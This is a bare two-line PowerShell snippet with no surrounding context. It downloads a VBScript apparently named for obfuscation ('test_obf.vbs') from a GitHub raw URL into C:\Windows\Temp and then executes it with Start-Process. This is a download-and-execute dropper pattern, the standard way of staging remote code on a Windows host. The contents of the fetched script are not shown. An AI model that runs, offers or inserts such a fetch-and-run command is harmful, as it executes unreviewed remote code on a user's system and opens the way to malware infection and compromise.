(New-Object System.Net.WebClient).DownloadFile("https://github.com/rude90/VBS/raw/main/test_obf.vbs", "C:\Windows\Temp\test_obf.vbs")
Start-Process "C:\Windows\Temp\test_obf.vbs"
